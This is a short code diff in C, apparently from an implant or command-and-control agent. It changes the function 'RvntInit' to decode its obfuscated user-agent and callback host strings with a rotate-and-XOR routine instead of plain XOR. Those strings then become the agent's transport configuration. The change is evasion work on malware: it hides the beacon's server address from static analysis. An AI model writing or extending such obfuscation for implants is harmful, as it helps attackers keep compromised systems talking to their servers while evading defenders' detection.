@@ -21,14 +21,17 @@ VOID RvntInit() {
     UCHAR e_UserAgent[] = CONFIG_USER_AGENT;
     CHAR e_Host[] = CONFIG_HOST;
 
-    xor_dec((PCHAR)e_UserAgent, sizeof(e_UserAgent), (PCHAR)s_xk, sizeof(s_xk));
-    xor_dec((PCHAR)e_Host, sizeof(e_Host), (PCHAR)s_xk, sizeof(s_xk));
+    UCHAR d_UserAgent[sizeof(e_UserAgent)] = {0};
+    CHAR d_Host[sizeof(e_Host)] = {0};
+
+    ROL_AND_DECRYPT((char *)e_UserAgent, sizeof(e_UserAgent), 1, d_UserAgent, (char *)s_xk, sizeof(s_xk));
+    ROL_AND_DECRYPT((char *)e_Host, sizeof(e_Host), 1, d_Host, (char *)s_xk, sizeof(s_xk));
 
     PWCHAR w_UserAgent = NULL;
     PWCHAR w_Host = NULL;
 
-    w_UserAgent = str_to_wide( e_UserAgent);
-    w_Host = str_to_wide(e_Host);
+    w_UserAgent = str_to_wide( d_UserAgent);
+    w_Host = str_to_wide(d_Host);
 
     Instance.Config.Transport.UserAgent = w_UserAgent;
     Instance.Config.Transport.Host      = w_Host;
